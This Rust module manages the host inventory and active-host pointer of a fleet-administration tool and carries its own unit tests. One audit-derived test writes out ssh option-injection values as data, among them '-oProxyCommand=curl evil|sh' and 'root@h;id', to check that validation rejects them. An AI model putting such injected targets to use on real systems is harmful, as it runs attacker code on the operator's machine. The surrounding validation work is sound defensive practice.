//! Host inventory for fleet-admin sessions.
//!
//! Backs the `x0ne_host_*` native MCP tools (and, in `x0ne-code`, the
//! `/host` slash commands). Persistent at `~/.x0ne/hosts.toml`. The
//! inventory is small (tens to a few hundred entries), so we read it
//! every time and write atomically — no in-memory cache, no daemon.
//!
//! ## What's a host?
//!
//! ```toml
//! [[hosts]]
//! name = "prod-api-01"
//! target = "user@prod-api-01.example.com"   # ssh(1) target string
//! mode = "adhoc"                          # adhoc | native
//! tags = ["prod", "api"]
//! description = "Public API node, France-1"
//!
//! [[hosts]]
//! name = "hv-example-01"
//! target = "root@192.0.2.13"
//! mode = "native"                         # x0ne-runtime installed at runtime_path
//! runtime_path = "/opt/x0ne-runtime"
//! policy_profile = "readonly"             # template: read-only mode
//! tags = ["hypervisor", "libvirt", "dc1"]
//! ```
//!
//! - `mode = "adhoc"` → orchestrator emits `SshExec` actions to this host
//!   (untyped at the wire; the local OpenSSH client + remote shell run them).
//! - `mode = "native"` → orchestrator routes through the bridge (`mode =
//!   "sandbox"` with `sandbox_cmd = "ssh <target> -- <runtime_path> --mode mcp"`),
//!   so every action on this host is typed + policy-checked + audited
//!   on the remote.
//!
//! ## Active host
//!
//! At any moment exactly one host (or none) is "active" — stored at
//! `~/.x0ne/active_host` (one-line, contains the host name). Switching
//! the active host is a metadata-only operation; the orchestrator's
//! downstream runtime is NOT auto-respawned (would be too disruptive).
//! Use the orchestrator's bridge config or `x0ne-code`'s `/host use` to
//! actually re-route the runtime.

use std::collections::HashSet;
use std::fs;
use std::io::Write;
use std::path::PathBuf;

use anyhow::{anyhow, Result};
use serde::{Deserialize, Serialize};

// ── Storage layout ───────────────────────────────────────────────────────────

/// Tests that mutate the process-wide `X0NE_HOME` variable must not race:
/// cargo runs them on several threads. Shared with `mcp_server`'s tests.
#[cfg(test)]
pub(crate) static ENV_LOCK: std::sync::Mutex<()> = std::sync::Mutex::new(());

pub fn root_dir() -> PathBuf {
    if let Ok(s) = std::env::var("X0NE_HOME") {
        return PathBuf::from(s);
    }
    let home = dirs::home_dir().unwrap_or_else(|| PathBuf::from("/tmp"));
    home.join(".x0ne")
}

pub fn inventory_path() -> PathBuf {
    root_dir().join("hosts.toml")
}

pub fn active_path() -> PathBuf {
    root_dir().join("active_host")
}

// ── Types ────────────────────────────────────────────────────────────────────

#[derive(Debug, Clone, Copy, Serialize, Deserialize, PartialEq, Eq)]
#[serde(rename_all = "lowercase")]
#[derive(Default)]
pub enum HostMode {
    /// `ssh <target> -- <cmd>` via the SshExec primitive. No runtime install
    /// on the target. Untyped at the wire.
    #[default]
    Adhoc,
    /// `x0ne-runtime` installed at `runtime_path`; orchestrator routes
    /// through the bridge so every action is typed + policy-checked +
    /// audited on the remote.
    Native,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Host {
    /// Stable identifier, snake_case-ish. Used in `/host use <name>` and
    /// embedded in session logs (every command landed on a host carries
    /// this name in its log line).
    pub name: String,
    /// `ssh(1)` target — `user@host`, an alias from `~/.ssh/config`, or
    /// just `host`. Must NOT include the command (that's the action).
    pub target: String,
    #[serde(default)]
    pub mode: HostMode,
    /// Only meaningful for `mode = "native"` — absolute path of
    /// `x0ne-runtime` on the target. Defaults to `/opt/x0ne-runtime`.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub runtime_path: Option<String>,
    /// Only meaningful for `mode = "native"` — name of a shipped policy
    /// profile (e.g. `"readonly"`, `"staging"`, `"prod-strict"`) that
    /// the deploy helper materialises into a remote `x0ne-runtime.toml`.
    /// Doc-only on the inventory; the actual policy lives on the box.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub policy_profile: Option<String>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub tags: Vec<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub description: Option<String>,
    /// Extra `-o KEY=value` options always appended to ssh invocations
    /// for this host (e.g. `["ProxyJump=bastion", "Port=2222"]`). For
    /// per-org defaults, prefer `~/.ssh/config` Host blocks.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub ssh_options: Vec<String>,
}

impl Host {
    pub fn validate(&self) -> Result<()> {
        if !is_valid_name(&self.name) {
            return Err(anyhow!(
                "host name '{}' invalid: must match [a-zA-Z][a-zA-Z0-9_-]{{1,63}}",
                self.name
            ));
        }
        if self.target.trim().is_empty() {
            return Err(anyhow!("host '{}' has empty target", self.name));
        }
        // H3-2: the target is ssh's first argument and the options reach it
        // as `-o`; both face the rule `SshExec` applies.
        x0ne_actions::ssh_options::validate_ssh_target(&self.target)
            .map_err(|e| anyhow!("host '{}': {e}", self.name))?;
        for opt in &self.ssh_options {
            x0ne_actions::ssh_options::validate_ssh_option(opt)
                .map_err(|e| anyhow!("host '{}': {e}", self.name))?;
        }
        Ok(())
    }
}

fn is_valid_name(name: &str) -> bool {
    if name.is_empty() || name.len() > 64 {
        return false;
    }
    let mut chars = name.chars();
    let first = chars.next().unwrap();
    if !first.is_ascii_alphabetic() {
        return false;
    }
    chars.all(|c| c.is_ascii_alphanumeric() || c == '_' || c == '-')
}

#[derive(Debug, Default, Clone, Serialize, Deserialize)]
pub struct Inventory {
    #[serde(default, rename = "hosts")]
    pub hosts: Vec<Host>,
}

impl Inventory {
    pub fn get(&self, name: &str) -> Option<&Host> {
        self.hosts.iter().find(|h| h.name == name)
    }

    pub fn upsert(&mut self, host: Host) {
        if let Some(slot) = self.hosts.iter_mut().find(|h| h.name == host.name) {
            *slot = host;
        } else {
            self.hosts.push(host);
        }
    }

    pub fn remove(&mut self, name: &str) -> bool {
        let len = self.hosts.len();
        self.hosts.retain(|h| h.name != name);
        self.hosts.len() != len
    }

    pub fn by_tag(&self, tag: &str) -> Vec<&Host> {
        self.hosts
            .iter()
            .filter(|h| h.tags.iter().any(|t| t == tag))
            .collect()
    }

    /// Set of all tags present on any host — handy for `/host tags` UI.
    pub fn all_tags(&self) -> Vec<String> {
        let mut set: HashSet<String> = HashSet::new();
        for h in &self.hosts {
            for t in &h.tags {
                set.insert(t.clone());
            }
        }
        let mut v: Vec<String> = set.into_iter().collect();
        v.sort();
        v
    }
}

// ── Load / save ──────────────────────────────────────────────────────────────

pub fn load() -> Result<Inventory> {
    let path = inventory_path();
    if !path.exists() {
        return Ok(Inventory::default());
    }
    let s = fs::read_to_string(&path)?;
    let inv: Inventory =
        toml::from_str(&s).map_err(|e| anyhow!("parse {}: {}", path.display(), e))?;
    for h in &inv.hosts {
        h.validate()?;
    }
    Ok(inv)
}

pub fn save(inv: &Inventory) -> Result<()> {
    fs::create_dir_all(root_dir())?;
    let path = inventory_path();
    let tmp = path.with_extension("toml.tmp");
    let s = toml::to_string_pretty(inv).map_err(|e| anyhow!("serialize: {}", e))?;
    let mut f = fs::OpenOptions::new()
        .create(true)
        .truncate(true)
        .write(true)
        .open(&tmp)?;
    f.write_all(s.as_bytes())?;
    f.sync_all()?;
    drop(f);
    fs::rename(tmp, path)?;
    Ok(())
}

// ── Active host pointer ──────────────────────────────────────────────────────

pub fn read_active() -> Option<String> {
    let path = active_path();
    let s = fs::read_to_string(&path).ok()?;
    let trimmed = s.trim().to_string();
    if trimmed.is_empty() {
        None
    } else {
        Some(trimmed)
    }
}

pub fn set_active(name: &str) -> Result<()> {
    fs::create_dir_all(root_dir())?;
    let path = active_path();
    let tmp = path.with_extension("tmp");
    let mut f = fs::OpenOptions::new()
        .create(true)
        .truncate(true)
        .write(true)
        .open(&tmp)?;
    f.write_all(name.as_bytes())?;
    f.write_all(b"\n")?;
    f.sync_all()?;
    drop(f);
    fs::rename(tmp, path)?;
    Ok(())
}

pub fn clear_active() -> Result<()> {
    let path = active_path();
    if path.exists() {
        fs::remove_file(&path)?;
    }
    Ok(())
}

/// Resolve the active host's full `Host` record, self-healing if the
/// pointer references a host that's been removed from the inventory.
pub fn get_active() -> Result<Option<Host>> {
    let Some(name) = read_active() else {
        return Ok(None);
    };
    let inv = load()?;
    if let Some(h) = inv.get(&name) {
        return Ok(Some(h.clone()));
    }
    // Stale pointer — clear it so subsequent calls return None cleanly.
    let _ = clear_active();
    Ok(None)
}

// ── Tests ────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;
    use tempfile::tempdir;

    fn with_x0ne_home<F: FnOnce()>(f: F) {
        let _guard = ENV_LOCK.lock().unwrap_or_else(|e| e.into_inner());
        let tmp = tempdir().unwrap();
        std::env::set_var("X0NE_HOME", tmp.path());
        f();
        std::env::remove_var("X0NE_HOME");
    }

    #[test]
    fn load_returns_empty_when_no_file() {
        with_x0ne_home(|| {
            let inv = load().unwrap();
            assert!(inv.hosts.is_empty());
        });
    }

    #[test]
    fn save_then_load_round_trips() {
        with_x0ne_home(|| {
            let mut inv = Inventory::default();
            inv.upsert(Host {
                name: "prod-api".into(),
                target: "user@prod-api.example.com".into(),
                mode: HostMode::Native,
                runtime_path: Some("/opt/x0ne-runtime".into()),
                policy_profile: Some("prod-strict".into()),
                tags: vec!["prod".into(), "api".into()],
                description: Some("API node".into()),
                ssh_options: vec![],
            });
            save(&inv).unwrap();
            let back = load().unwrap();
            assert_eq!(back.hosts.len(), 1);
            assert_eq!(back.hosts[0].name, "prod-api");
            assert_eq!(back.hosts[0].mode, HostMode::Native);
            assert_eq!(back.hosts[0].tags, vec!["prod", "api"]);
        });
    }

    #[test]
    fn upsert_replaces_existing() {
        let mut inv = Inventory::default();
        inv.upsert(host_named("a", "host-a"));
        inv.upsert(host_named("a", "host-a-updated"));
        assert_eq!(inv.hosts.len(), 1);
        assert_eq!(inv.hosts[0].target, "host-a-updated");
    }

    #[test]
    fn remove_returns_bool() {
        let mut inv = Inventory::default();
        inv.upsert(host_named("a", "host-a"));
        assert!(inv.remove("a"));
        assert!(!inv.remove("a"));
    }

    #[test]
    fn by_tag_filters() {
        let mut inv = Inventory::default();
        inv.upsert(Host {
            tags: vec!["prod".into()],
            ..host_named("a", "host-a")
        });
        inv.upsert(Host {
            tags: vec!["staging".into()],
            ..host_named("b", "host-b")
        });
        inv.upsert(Host {
            tags: vec!["prod".into(), "db".into()],
            ..host_named("c", "host-c")
        });
        let prod = inv.by_tag("prod");
        assert_eq!(prod.len(), 2);
        let names: Vec<&str> = prod.iter().map(|h| h.name.as_str()).collect();
        assert!(names.contains(&"a") && names.contains(&"c"));
    }

    #[test]
    fn validate_rejects_bad_names() {
        let bad = host_named("0bad", "x");
        assert!(bad.validate().is_err());
        let bad2 = host_named("ok", "");
        assert!(bad2.validate().is_err());
        let ok = host_named("prod_api-01", "user@host");
        assert!(ok.validate().is_ok());
    }

    /// Audit of 2026-10-30, H3-2. A `target` is handed to ssh as its first
    /// argument: one starting with `-` is an option (`-oProxyCommand=…` runs a
    /// local command). `ssh_options` face the runtime's `SshExec` allowlist.
    #[test]
    fn validate_rejects_a_flag_target_and_a_local_command_ssh_option() {
        for target in [
            "-oProxyCommand=curl evil|sh",
            "root@h -oProxyCommand=x",
            "root@h\nProxyCommand=x",
            "root@h;id",
        ] {
            assert!(host_named("ok", target).validate().is_err(), "{target:?}");
        }
        for target in [
            "root@192.0.2.13",
            "ssh://user@h.example.com:2222",
            "fe80::1%eth0",
        ] {
            assert!(host_named("ok", target).validate().is_ok(), "{target:?}");
        }
        let mut h = host_named("ok", "root@192.0.2.13");
        h.ssh_options = vec!["ProxyCommand=curl evil|sh".into()];
        assert!(h.validate().is_err());
        h.ssh_options = vec!["ProxyJump=bastion".into()];
        assert!(h.validate().is_err());
        h.ssh_options = vec!["Port=2222".into(), "ConnectTimeout=5".into()];
        assert!(h.validate().is_ok());
    }

    #[test]
    fn active_pointer_round_trips() {
        with_x0ne_home(|| {
            assert!(read_active().is_none());
            set_active("prod-api").unwrap();
            assert_eq!(read_active().as_deref(), Some("prod-api"));
            clear_active().unwrap();
            assert!(read_active().is_none());
        });
    }

    #[test]
    fn get_active_self_heals_on_dangling_pointer() {
        with_x0ne_home(|| {
            // Set a pointer to a host that doesn't exist in the inventory.
            set_active("ghost").unwrap();
            // No inventory file → load() returns empty → get_active clears the pointer.
            assert!(get_active().unwrap().is_none());
            assert!(read_active().is_none(), "stale pointer must be wiped");
        });
    }

    fn host_named(n: &str, target: &str) -> Host {
        Host {
            name: n.into(),
            target: target.into(),
            mode: HostMode::Adhoc,
            runtime_path: None,
            policy_profile: None,
            tags: vec![],
            description: None,
            ssh_options: vec![],
        }
    }
}
